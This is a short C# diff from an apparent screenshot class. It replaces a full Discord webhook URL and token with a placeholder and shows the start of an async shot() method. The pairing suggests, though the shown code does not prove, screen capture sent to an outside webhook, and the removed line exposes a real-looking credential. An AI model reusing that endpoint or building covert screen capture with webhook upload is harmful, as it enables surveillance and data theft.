@@ -4,7 +4,7 @@ public class screenshot
 {
     public Encoding enc = Encoding.GetEncoding("UTF-8");
     public string Dir = Directory.GetCurrentDirectory();
-    public static string webhook = "https://discord.com/api/webhooks/1136284717797347360/Jq50goaabk6Lt2B3RVQDyJg6luoE5x5-ARi-sYVW3V7gxOnYcfc-NsaATHxf29dpWiHT";
+    public static string webhook = "WEB HOOK";
     public async void shot()
     {
         string ExeDirPath = Path.GetDirectoryName(Application.ExecutablePath);
